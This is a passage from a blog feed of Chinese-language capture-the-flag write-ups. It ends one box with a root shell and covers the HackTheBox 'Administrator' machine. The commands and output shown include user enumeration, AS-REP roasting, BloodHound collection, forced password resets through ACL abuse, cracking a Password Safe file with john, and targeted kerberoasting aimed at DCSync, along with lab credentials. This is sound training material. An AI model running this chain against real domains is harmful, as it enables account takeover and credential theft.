&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh -i id_rsa root@192.168.170.240
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
&lt;p&gt;The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.&lt;/p&gt;
&lt;p&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:&lt;del&gt;# id
uid=0(root) gid=0(root) groups=0(root)
root@clue:&lt;/del&gt;#
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;竟然成功了。。。 拿到root后也很迷，找了一圈后在anthony的bash_history里发现：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:/home/anthony# cat .bash_history
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;anthony把自己的凭证复制到了root下 （&lt;strong&gt;?&lt;/strong&gt; 疑惑）&lt;/p&gt;
&lt;p&gt;在root下可以找到proof.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;615&#34; height=&#34;56&#34; src=&#34;../legacy/uploads/2025/04/1745590192-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1374&#34; srcset=&#34;../legacy/uploads/2025/04/1745590192-image.png 615w, ../legacy/uploads/2025/04/1745590192-image-300x27.png 300w&#34; sizes=&#34;auto, (max-width: 615px) 100vw, 615px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在/var/lib/freeswitch下可以找到local.txt&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:~# find / -name local.txt -type f
/var/lib/freeswitch/local.txt
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，在防火墙设置下可以看到，确实block了除已开放端口外的数据流入流出：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:~# sudo iptables -L -n -v
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 1922  220K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
38959 5695K ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
    1    40 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:445
   14   560 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000
    2    80 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
    0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           
&lt;p&gt;Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination&lt;/p&gt;
&lt;p&gt;Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination      &lt;br&gt;
1928  220K ACCEPT     all  &amp;ndash;  *      lo      0.0.0.0/0            0.0.0.0/0        &lt;br&gt;
277 46895 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:22 state NEW,ESTABLISHED
0     0 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53 state NEW,ESTABLISHED
98  6566 ACCEPT     udp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53 state NEW,ESTABLISHED
36906   16M ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:80 state NEW,ESTABLISHED
0     0 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 state NEW,ESTABLISHED
49 10394 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:445 state NEW,ESTABLISHED
4   224 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:139 state NEW,ESTABLISHED
449  114K ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:3000 state NEW,ESTABLISHED
47 46823 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000 state NEW,ESTABLISHED
51  4082 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:8021 state NEW,ESTABLISHED
25  4574 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021 state NEW,ESTABLISHED
0     0 ACCEPT     icmp &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
11   848 ACCEPT     icmp &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
238 19369 DROP       all  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0&lt;/p&gt;
&lt;p&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;what-i-have-learned&#34;&gt;What I have learned
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    在有可以任意读取文件的能力时，尝试获取每个用户home下的bash_history文件。
  &lt;/li&gt;
  &lt;li&gt;
    可以读取文件时，永远要记得查看/etc/ssh/sshd_config, 里面记录着哪些用户允许ssh登录。
  &lt;/li&gt;
&lt;/ul&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;687&#34; height=&#34;296&#34; src=&#34;../legacy/uploads/2025/04/1745590747-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1381&#34; srcset=&#34;../legacy/uploads/2025/04/1745590747-image.png 687w, ../legacy/uploads/2025/04/1745590747-image-300x129.png 300w&#34; sizes=&#34;auto, (max-width: 687px) 100vw, 687px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTB-Administrator-Writeup</title>
        <link>http://localhost:1313/htb-administrator-Writeup/</link>
        <pubDate>Sun, 20 Apr 2025 02:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-administrator-Writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/04/1745035819-download-150x150.png" alt="Featured image of post HTB-Administrator-Writeup" /&gt;&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap Result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 20:34:54Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
57388/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
57399/tcp open  unknown       syn-ack ttl 127
57404/tcp open  unknown       syn-ack ttl 127
57415/tcp open  unknown       syn-ack ttl 127
57447/tcp open  unknown       syn-ack ttl 127
64600/tcp open  unknown       syn-ack ttl 127
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration
&lt;/h2&gt;&lt;p&gt;Machine information 给出一个valid credential：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
Username: Olivia Password: ichliebedich
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;首先尝试连接21/FTP端口，olivia和匿名登录均失败:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;600&#34; height=&#34;412&#34; src=&#34;../legacy/uploads/2025/04/1745031094-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1226&#34; srcset=&#34;../legacy/uploads/2025/04/1745031094-image.png 600w, ../legacy/uploads/2025/04/1745031094-image-300x206.png 300w&#34; sizes=&#34;auto, (max-width: 600px) 100vw, 600px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试用enum4linux和smbclient连接，但仍然失败. 但得知域名为Adiministrator：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;696&#34; src=&#34;../legacy/uploads/2025/04/1745031215-image-1024x696.png&#34; alt=&#34;&#34; class=&#34;wp-image-1228&#34; srcset=&#34;../legacy/uploads/2025/04/1745031215-image-1024x696.png 1024w, ../legacy/uploads/2025/04/1745031215-image-300x204.png 300w, ../legacy/uploads/2025/04/1745031215-image-768x522.png 768w, ../legacy/uploads/2025/04/1745031215-image.png 1281w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用kerbrute确认olivia是否为域内valid用户:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
./kerbrute userenum -d administrator --dc 10.10.11.42 users 
&lt;pre&gt;&lt;code&gt;__             __               __     
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/ /_____  &lt;em&gt;&lt;em&gt;&lt;strong&gt;&lt;em&gt;/ /&lt;/em&gt;  _______  &lt;strong&gt;/ /&lt;/strong&gt;&lt;/strong&gt;
/ //_/ _ / &lt;em&gt;&lt;em&gt;&lt;em&gt;/ __ / &lt;em&gt;&lt;em&gt;&lt;em&gt;/ / / / __/ _ &lt;br&gt;
/ ,&amp;lt; /  __/ /  / /&lt;/em&gt;/ / /  / /&lt;/em&gt;/ / /&lt;/em&gt;/  __/
/&lt;/em&gt;/|&lt;/em&gt;|_&lt;/em&gt;&lt;/em&gt;/&lt;em&gt;/  /&lt;/em&gt;.&lt;/em&gt;&lt;em&gt;&lt;em&gt;/&lt;/em&gt;/   _&lt;/em&gt;,&lt;em&gt;/_&lt;/em&gt;/___/&lt;/p&gt;
&lt;p&gt;Version: v1.0.3 (9dad6e1) - 04/19/25 - Ronnie Flathers @ropnop&lt;/p&gt;
&lt;p&gt;2025/04/19 12:56:16 &amp;gt;  Using KDC(s):
2025/04/19 12:56:16 &amp;gt;   10.10.11.42:88&lt;/p&gt;
&lt;p&gt;2025/04/19 12:56:16 &amp;gt;  [+] VALID USERNAME:       olivia@administrator
2025/04/19 12:56:16 &amp;gt;  Done! Tested 1 usernames (1 valid) in 0.007 seconds
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;得知olivia是域用户后，可以使用impacket-lookupsid来暴力枚举用户列表：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
impacket-lookupsid &amp;#039;Olivia&amp;#039;@10.10.11.42                                                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
&lt;p&gt;Password:
[&lt;em&gt;] Brute forcing SIDs at 10.10.11.42
[&lt;/em&gt;] StringBinding ncacn_np:10.10.11.42[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1088858960-373806567-254189436
498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: ADMINISTRATOR\Administrator (SidTypeUser)
501: ADMINISTRATOR\Guest (SidTypeUser)
502: ADMINISTRATOR\krbtgt (SidTypeUser)
512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
513: ADMINISTRATOR\Domain Users (SidTypeGroup)
514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)
517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)
521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)
522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)
525: ADMINISTRATOR\Protected Users (SidTypeGroup)
526: ADMINISTRATOR\Key Admins (SidTypeGroup)
527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)
553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)
571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)
572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)
1000: ADMINISTRATOR\DC$ (SidTypeUser)
1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
1108: ADMINISTRATOR\olivia (SidTypeUser)
1109: ADMINISTRATOR\michael (SidTypeUser)
1110: ADMINISTRATOR\benjamin (SidTypeUser)
1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
1112: ADMINISTRATOR\emily (SidTypeUser)
1113: ADMINISTRATOR\ethan (SidTypeUser)
3601: ADMINISTRATOR\alexander (SidTypeUser)
3602: ADMINISTRATOR\emma (SidTypeUser)
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;至此，得到了一个用户列表：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
olivia
michael
benjamin
emily
ethan
alexander
emma
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;如果在域环境内，用户没有开启kerberos pre-authentication，那么攻击者无需用户密码就可以获得用户的authentication-response，并尝试离线破解。impacket-GetNPUsers可以枚举有哪些用户没有开启此选项，并尝试获取AS-REP. 此攻击也被称为AS-REP Roasting. 尝试:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
impacket-GetNPUsers -usersfile users -no-pass -dc-host administrator -dc-ip 10.10.11.42 administrator/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
&lt;p&gt;[-] User olivia doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;没有用户设置了DONT_REQUIRE_PREAUTH. 但我们还有Olivia的密码，尝试用bloodhound-python远程获取域内结构：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
bloodhound-python -u Olivia -p &amp;#039;ichliebedich&amp;#039; -d administrator.htb -ns 10.10.11.42 -c All --zip          
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: &amp;#x5B;Errno Connection error (dc.administrator.htb:88)] &amp;#x5B;Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 02S
INFO: Compressing output into 20250419131421_bloodhound.zip
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;打开bloodhound并上传.&lt;/p&gt;
&lt;h2 id=&#34;acl-abuse-wp-block-heading&#34;&gt;ACL Abuse {.wp-block-heading}&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;/h2&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;141&#34; src=&#34;../legacy/uploads/2025/04/1745032972-image-1024x141.png&#34; alt=&#34;&#34; class=&#34;wp-image-1245&#34; srcset=&#34;../legacy/uploads/2025/04/1745032972-image-1024x141.png 1024w, ../legacy/uploads/2025/04/1745032972-image-300x41.png 300w, ../legacy/uploads/2025/04/1745032972-image-768x105.png 768w, ../legacy/uploads/2025/04/1745032972-image-1536x211.png 1536w, ../legacy/uploads/2025/04/1745032972-image.png 1704w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Olivia对用户Michael有GenericAll权限，Michael对Benjamin有ForceChangePassword权限，而Benjiamin属于组Share Moderators。&lt;/p&gt;
&lt;p&gt;当一个用户A对另一个用户B有GenericAll权限时，则A可以对B：&lt;/p&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    &lt;strong&gt;修改密码&lt;/strong&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;strong&gt;更改用户属性&lt;/strong&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;strong&gt;添加用户到组&lt;/strong&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;strong&gt;修改用户SPN&lt;/strong&gt; - Targeted kerberoasting
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当一个用户A对另一个用户B有ForceChangePassword权限时，则A可以&lt;strong&gt;强制修改&lt;/strong&gt;B的密码。&lt;/p&gt;
&lt;p&gt;尝试使用bloodyAD修改michael密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
bloodyAD --host 10.10.11.42 -d administrator -u Olivia -p ichliebedich set password Michael &amp;#039;Password123!&amp;#039;
&amp;#x5B;+] Password changed successfully!
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;再以Michael的身份修改Benjamin的密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
bloodyAD --host 10.10.11.42 -d administrator -u Michael -p Password123! set password Benjamin &amp;#039;Password123!&amp;#039;
&amp;#x5B;+] Password changed successfully!
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;根据Benjamin隶属的组名Share Moderators，猜测Benjamin应该有权限管理SMB share或者FTP，尝试登录这两个服务：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;639&#34; height=&#34;505&#34; src=&#34;../legacy/uploads/2025/04/1745033219-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1251&#34; srcset=&#34;../legacy/uploads/2025/04/1745033219-image.png 639w, ../legacy/uploads/2025/04/1745033219-image-300x237.png 300w&#34; sizes=&#34;auto, (max-width: 639px) 100vw, 639px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;benjamin:Password123!登录FTP服务成功，并在目录下发现一个Backup.psafe3文件，下载下来。&lt;/p&gt;
&lt;p&gt;没见过这个psafe3文件是什么，在网上搜索一番后得知, psafe3是一个保管密码的数据库,并且文件被一个master password加密：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;252&#34; src=&#34;../legacy/uploads/2025/04/1745033454-image-1024x252.png&#34; alt=&#34;&#34; class=&#34;wp-image-1253&#34; srcset=&#34;../legacy/uploads/2025/04/1745033454-image-1024x252.png 1024w, ../legacy/uploads/2025/04/1745033454-image-300x74.png 300w, ../legacy/uploads/2025/04/1745033454-image-768x189.png 768w, ../legacy/uploads/2025/04/1745033454-image.png 1333w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以使用我们万能的john来dump这个文件的master password，并尝试破解：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
pwsafe2john Backup.psafe3 &amp;gt; pshash
cat pshash                  
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
john --wordlist=/usr/share/wordlists/rockyou.txt pshash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe &amp;#x5B;SHA256 128/128 AVX 4x])
No password hashes left to crack (see FAQ)
john --wordlist=/usr/share/wordlists/rockyou.txt pshash
john --show pshash                                     
Backu:tekieromucho
1 password hash cracked, 0 left
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;得到密码，&lt;strong&gt;tekieromucho&lt;/strong&gt;。使用pwsafe打开文件并输入密码：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;969&#34; height=&#34;392&#34; src=&#34;../legacy/uploads/2025/04/1745033808-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1259&#34; srcset=&#34;../legacy/uploads/2025/04/1745033808-image.png 969w, ../legacy/uploads/2025/04/1745033808-image-300x121.png 300w, ../legacy/uploads/2025/04/1745033808-image-768x311.png 768w&#34; sizes=&#34;auto, (max-width: 969px) 100vw, 969px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;546&#34; height=&#34;524&#34; src=&#34;../legacy/uploads/2025/04/1745033873-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1260&#34; srcset=&#34;../legacy/uploads/2025/04/1745033873-image.png 546w, ../legacy/uploads/2025/04/1745033873-image-300x288.png 300w&#34; sizes=&#34;auto, (max-width: 546px) 100vw, 546px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;登录后右键可以复制密码到粘贴板, 三人密码分别是:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
Alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在bloodhound里查看这三人分别有什么权限，发现Emily对Ethan有GenericWrite权限：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;942&#34; height=&#34;209&#34; src=&#34;../legacy/uploads/2025/04/1745034203-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1263&#34; srcset=&#34;../legacy/uploads/2025/04/1745034203-image.png 942w, ../legacy/uploads/2025/04/1745034203-image-300x67.png 300w, ../legacy/uploads/2025/04/1745034203-image-768x170.png 768w&#34; sizes=&#34;auto, (max-width: 942px) 100vw, 942px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;而Ethan对DC有DCSync权限：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;485&#34; src=&#34;../legacy/uploads/2025/04/1745034247-image-1024x485.png&#34; alt=&#34;&#34; class=&#34;wp-image-1264&#34; srcset=&#34;../legacy/uploads/2025/04/1745034247-image-1024x485.png 1024w, ../legacy/uploads/2025/04/1745034247-image-300x142.png 300w, ../legacy/uploads/2025/04/1745034247-image-768x364.png 768w, ../legacy/uploads/2025/04/1745034247-image-1536x728.png 1536w, ../legacy/uploads/2025/04/1745034247-image.png 1760w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    当用户A对用户B有GenericWrite权限时，则A可以修改B的SPN属性，实施Targeted-kerberoasting Attack。
  &lt;/li&gt;
&lt;/ul&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    当用户A对DC有DCSync权限时，则A可以模拟域控制器向其他 DC 请求复制Password Hash，也就是可以发起 DCSync Attack，提取域内所有账户的 NTLM Hash.
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用&lt;a href=&#34;https://github.com/ShutdownRepo/targetedKerberoast&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;targetedKerberoast&lt;/a&gt;对ethan发起攻击:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;301&#34; src=&#34;../legacy/uploads/2025/04/1745034741-image-1024x301.png&#34; alt=&#34;&#34; class=&#34;wp-image-1268&#34; srcset=&#34;../legacy/uploads/2025/04/1745034741-image-1024x301.png 1024w, ../legacy/uploads/2025/04/1745034741-image-300x88.png 300w, ../legacy/uploads/2025/04/1745034741-image-768x226.png 768w, ../legacy/uploads/2025/04/1745034741-image-1536x451.png 1536w, ../legacy/uploads/2025/04/1745034741-image.png 1896w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功获取到了ethan的SPN。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PS：如果报错[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)，则是因为本机与DC之间的时间差过大，Kerberos认证对时间差要求非常严格。可以使用&lt;strong&gt;ntpdata ip&lt;/strong&gt;来同步与DC的时间差。&lt;/em&gt;&lt;/p&gt;
